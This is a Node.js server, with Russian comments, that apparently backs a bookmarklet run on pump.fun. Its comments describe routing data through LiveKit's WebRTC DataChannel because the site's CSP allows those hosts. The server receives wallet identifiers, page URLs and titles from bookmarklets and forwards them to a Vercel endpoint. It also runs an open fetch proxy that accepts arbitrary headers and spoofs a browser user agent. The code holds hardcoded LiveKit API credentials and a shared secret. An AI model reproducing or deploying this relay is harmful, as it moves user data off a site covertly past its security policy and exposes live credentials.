'use strict';

/**
 * Railway LiveKit Agent v6
 *
 * АРХИТЕКТУРА:
 *   pump.fun
 *     └─ букмарклет грузит livekit-client с cdn.jsdelivr.net  (CSP: script-src разрешён)
 *     └─ подключается к wss://*.livekit.cloud                 (CSP: connect-src разрешён)
 *     └─ publishData(payload, {reliable:true})
 *              ↓  LiveKit DataChannel (WebRTC)
 *   Railway (этот process)
 *     └─ @livekit/rtc-node Room → RoomEvent.DataReceived      ← ПРАВИЛЬНЫЙ способ
 *     └─ processData(msg, fromIdentity)
 *     └─ room.localParticipant.publishData() → обратно в комнату → букмарклет alert()
 *     └─ POST VERCEL_URL/api/agent-data → Vercel хранит событие → UI polling
 *
 * ПОЧЕМУ СТАРЫЙ КОД НЕ РАБОТАЛ:
 *   - Старый сервер подключался к LiveKit /rtc как raw WebSocket + protobuf
 *   - publishData() в браузере отправляет данные через WebRTC DataChannel
 *   - SignalResponse НЕ СОДЕРЖИТ поле dataPacket — это только SignalRequest
 *   - Без ICE negotiation и PeerConnection DataChannel никогда не открывается
 *   - Поэтому данные никогда не доходили до Railway
 *
 * РЕШЕНИЕ:
 *   @livekit/rtc-node — официальный Node.js клиент с нативным WebRTC (WASM)
 *   Устанавливает полноценный PeerConnection, открывает DataChannel
 *   RoomEvent.DataReceived срабатывает когда приходят данные от publishData()
 */

var http   = require('http');
var https  = require('https');
var { Room, RoomEvent, DataPacketKind } = require('@livekit/rtc-node');
var { AccessToken, RoomServiceClient, DataPacket_Kind } = require('livekit-server-sdk');

var PORT           = process.env.PORT               || 8080;
var LK_API_KEY     = process.env.LIVEKIT_API_KEY    || 'APIAsfxvEYsPGA2';
var LK_API_SECRET  = process.env.LIVEKIT_API_SECRET || 'JCHcXc1lYger14JRo6IRih7pJRg8UyoUayGuHMmEKoK';
var LK_WS_URL      = process.env.LIVEKIT_URL        || 'wss://jack-6u9u95rm.livekit.cloud';
var LK_HTTP_URL    = LK_WS_URL.replace(/^wss?:\/\//, 'https://');
var ROOM_NAME      = process.env.LK_ROOM            || 'bookmark-room';
var AGENT_IDENTITY = 'railway-agent-v6';
var VERCEL_URL     = process.env.VERCEL_URL         || 'https://waterzay.vercel.app/';
var AGENT_SECRET   = process.env.AGENT_SECRET       || 'lk-agent-secret-2024';

// ─── RoomServiceClient — отправляет ответ через LiveKit REST API ─────────────
var roomService = new RoomServiceClient(LK_HTTP_URL, LK_API_KEY, LK_API_SECRET);

// Глобальный room instance — нужен для publishData обратно
var agentRoom = null;
var agentConnected = false;
var totalReceived = 0;
var reconnectTimer = null;

// ─── Отправляем ответ обратно в LiveKit комнату ──────────────────────────────
function sendDataToRoom(data, toIdentities) {
  if (!agentRoom || !agentConnected) {
    console.error('[sendData] Агент не подключён, пробуем через RoomService REST...');
    // Fallback: через REST API
    var bytes = Buffer.from(JSON.stringify(data), 'utf8');
    var opts = {};
    if (toIdentities && toIdentities.length > 0) {
      opts.destinationIdentities = toIdentities;
    }
    return roomService
      .sendData(ROOM_NAME, bytes, DataPacket_Kind.RELIABLE, opts)
      .then(function () { console.log('[sendData/REST] OK action=' + data.action); })
      .catch(function (e) { console.error('[sendData/REST] ERR ' + e.message); });
  }

  try {
    var encoder = new TextEncoder();
    var encoded = encoder.encode(JSON.stringify(data));
    var opts = { reliable: true };
    if (toIdentities && toIdentities.length > 0) {
      opts.destinationIdentities = toIdentities;
    }
    agentRoom.localParticipant.publishData(encoded, opts);
    console.log('[sendData] OK action=' + data.action + ' to=' + (toIdentities || ['all']).join(','));
    return Promise.resolve();
  } catch (e) {
    console.error('[sendData] ERR ' + e.message);
    return Promise.reject(e);
  }
}

// ─── Отправляем данные на Vercel /api/agent-data ─────────────────────────────
function pushToVercel(fromIdentity, action, payload) {
  var body = JSON.stringify({
    fromIdentity: fromIdentity,
    action: action,
    payload: payload,
    source: 'livekit',
  });

  var urlObj;
  try {
    urlObj = new URL(VERCEL_URL + '/api/agent-data');
  } catch (e) {
    console.error('[push] Bad VERCEL_URL: ' + e.message);
    return;
  }

  var isHttps = urlObj.protocol === 'https:';
  var options = {
    hostname: urlObj.hostname,
    port: urlObj.port || (isHttps ? 443 : 80),
    path: urlObj.pathname,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(body),
      'X-Agent-Secret': AGENT_SECRET,
    },
  };

  var mod = isHttps ? https : http;
  var req = mod.request(options, function (res) {
    var data = '';
    res.on('data', function (c) { data += c; });
    res.on('end', function () {
      console.log('[push] Vercel ' + res.statusCode + ' ' + data.substring(0, 80));
    });
  });
  req.on('error', function (e) { console.error('[push] HTTP error: ' + e.message); });
  req.write(body);
  req.end();
}

// ─── Обработка данных от букмарклета ────────────────────────────────────────
function processData(msg, fromIdentity) {
  var action  = msg.action  || 'unknown';
  var payload = msg.payload || msg || {};
  console.log('[relay] from=' + fromIdentity + ' action=' + action);

  // Всегда пушим событие на Vercel (для UI)
  pushToVercel(fromIdentity, action, payload);

  if (action === 'ping') {
    sendDataToRoom({
      action: 'pong',
      message: 'Railway agent v6 online! (rtc-node)',
      room: ROOM_NAME,
      ts: Date.now(),
    }, [fromIdentity]);

  } else if (action === 'wallet') {
    console.log('[wallet] from=' + fromIdentity + ' wallet=' + (payload.wallet || '—'));
    sendDataToRoom({
      action: 'ack',
      ok: true,
      message: 'Wallet получен! Vercel уведомлён.',
      wallet: payload.wallet,
      ts: Date.now(),
    }, [fromIdentity]);

  } else if (action === 'data') {
    console.log('[data] url='   + (payload.url   || '—'));
    console.log('[data] title=' + (payload.title || '—'));
    sendDataToRoom({
      action: 'ack',
      ok: true,
      message: 'Railway v6 получил данные!',
      received: {
        url:   payload.url,
        title: payload.title,
      },
      ts: Date.now(),
    }, [fromIdentity]);

  } else if (action === 'fetch') {
    var targetUrl = (payload.url || msg.url || '').toString();
    if (!targetUrl) {
      sendDataToRoom({ action: 'fetch_result', ok: false, error: 'url required', ts: Date.now() }, [fromIdentity]);
      return;
    }
    console.log('[fetch] ' + targetUrl);

    var fetchHeaders = Object.assign(
      {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
      },
      payload.headers || {}
    );

    fetch(targetUrl, { headers: fetchHeaders })
      .then(function (r) {
        var status = r.status;
        return r.text().then(function (t) {
          var d;
          try { d = JSON.parse(t); } catch (_) { d = t.substring(0, 8000); }
          pushToVercel(fromIdentity, 'fetch_result', { url: targetUrl, status: status, data: d });
          sendDataToRoom({
            action: 'fetch_result',
            ok: true,
            status: status,
            url: targetUrl,
            data: d,
            ts: Date.now(),
          }, [fromIdentity]);
        });
      })
      .catch(function (e) {
        sendDataToRoom({ action: 'fetch_result', ok: false, error: e.message, url: targetUrl, ts: Date.now() }, [fromIdentity]);
      });

  } else {
    sendDataToRoom({ action: 'ack', ok: true, echo: action, ts: Date.now() }, [fromIdentity]);
  }
}

// ─── Подключение через @livekit/rtc-node (ПРАВИЛЬНЫЙ способ) ─────────────────
async function connectAgent() {
  if (reconnectTimer) {
    clearTimeout(reconnectTimer);
    reconnectTimer = null;
  }

  var at = new AccessToken(LK_API_KEY, LK_API_SECRET, {
    identity: AGENT_IDENTITY,
    ttl: '24h',
  });
  at.addGrant({
    room: ROOM_NAME,
    roomJoin: true,
    canPublish: true,
    canPublishData: true,
    canSubscribe: true,
  });

  var token;
  try {
    token = await at.toJwt();
  } catch (e) {
    console.error('[agent] Token error: ' + e.message + '. Retry in 10s...');
    reconnectTimer = setTimeout(connectAgent, 10000);
    return;
  }

  var room = new Room();
  agentRoom = room;

  // ─── DataReceived — срабатывает когда букмарклет делает publishData() ─────
  room.on(RoomEvent.DataReceived, function (data, participant, kind, topic) {
    var fromId = (participant && participant.identity) || 'unknown';
    if (fromId === AGENT_IDENTITY) return; // игнорируем свои пакеты

    totalReceived++;
    var text = Buffer.from(data).toString('utf8');
    console.log('[data] #' + totalReceived + ' from=' + fromId + ' len=' + text.length + (topic ? ' topic=' + topic : ''));

    try {
      processData(JSON.parse(text), fromId);
    } catch (e) {
      console.error('[data] JSON parse error: ' + e.message);
      sendDataToRoom({ action: 'error', error: 'JSON parse: ' + e.message, ts: Date.now() }, [fromId]);
    }
  });

  room.on(RoomEvent.Connected, function () {
    agentConnected = true;
    console.log('');
    console.log('[agent] ✓ Connected via @livekit/rtc-node!');
    console.log('[agent] Room: ' + ROOM_NAME + ' | Identity: ' + AGENT_IDENTITY);
    console.log('[agent] Waiting for data from bookmarklets...');
    console.log('');
  });

  room.on(RoomEvent.Disconnected, function () {
    agentConnected = false;
    agentRoom = null;
    console.log('[agent] Disconnected. Reconnect in 5s...');
    reconnectTimer = setTimeout(connectAgent, 5000);
  });

  room.on(RoomEvent.ParticipantConnected, function (participant) {
    console.log('[agent] Participant joined: ' + participant.identity);
  });

  room.on(RoomEvent.ParticipantDisconnected, function (participant) {
    console.log('[agent] Participant left: ' + participant.identity);
  });

  try {
    console.log('[agent] Connecting to ' + LK_WS_URL + ' room=' + ROOM_NAME + '...');
    await room.connect(LK_WS_URL, token, {
      autoSubscribe: true,
    });
  } catch (e) {
    console.error('[agent] Connect error: ' + e.message + '. Retry in 5s...');
    agentConnected = false;
    agentRoom = null;
    reconnectTimer = setTimeout(connectAgent, 5000);
  }
}

// ─── HTTP server ─────────────────────────────────────────────────────────────
var httpServer = http.createServer(function (req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type,Authorization,X-Agent-Secret');
  if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }

  // Health / status
  if (req.method === 'GET' && (req.url === '/' || req.url === '/health')) {
    res.writeHead(200, { 'content-type': 'application/json' });
    res.end(JSON.stringify({
      ok: true,
      service: 'railway-livekit-agent-v6',
      transport: '@livekit/rtc-node',
      room: ROOM_NAME,
      agentConnected: agentConnected,
      totalReceived: totalReceived,
      vercelUrl: VERCEL_URL,
      ts: Date.now(),
    }));
    return;
  }

  // /relay — HTTP POST от букмарклетов (если не pump.fun)
  if (req.method === 'POST' && req.url === '/relay') {
    var body = '';
    req.on('data', function (c) { body += c.toString(); });
    req.on('end', function () {
      try {
        processData(JSON.parse(body), 'http-relay');
        res.writeHead(200, { 'content-type': 'application/json' });
        res.end(JSON.stringify({ ok: true, message: 'Data received by Railway agent v6' }));
      } catch (e) {
        res.writeHead(400, { 'content-type': 'application/json' });
        res.end(JSON.stringify({ ok: false, error: e.message }));
      }
    });
    return;
  }

  // /webhook — LiveKit webhooks (room/participant events)
  if (req.method === 'POST' && req.url === '/webhook') {
    var wb = '';
    req.on('data', function (c) { wb += c.toString(); });
    req.on('end', function () {
      try {
        var evt = JSON.parse(wb);
        console.log('[webhook] event=' + (evt.event || '?') + ' room=' + (evt.room && evt.room.name || '?'));
      } catch (_) {}
      res.writeHead(200, { 'content-type': 'application/json' });
      res.end(JSON.stringify({ ok: true }));
    });
    return;
  }

  res.writeHead(404);
  res.end(JSON.stringify({ ok: false, error: 'Not found' }));
});

httpServer.listen(PORT, function () {
  console.log('');
  console.log('╔══════════════════════════════════════════════════════════════╗');
  console.log('║  Railway LiveKit Agent v6  (@livekit/rtc-node)              ║');
  console.log('║  pump.fun → bukmarklet → LiveKit DataChannel → THIS → Vercel║');
  console.log('╚══════════════════════════════════════════════════════════════╝');
  console.log('');
  console.log('[server] Port:     ' + PORT);
  console.log('[server] Room:     ' + ROOM_NAME);
  console.log('[server] LiveKit:  ' + LK_WS_URL);
  console.log('[server] Vercel:   ' + VERCEL_URL);
  console.log('[server] Fix:      raw WS+protobuf → @livekit/rtc-node (DataChannel)');
  console.log('');
  connectAgent();
});



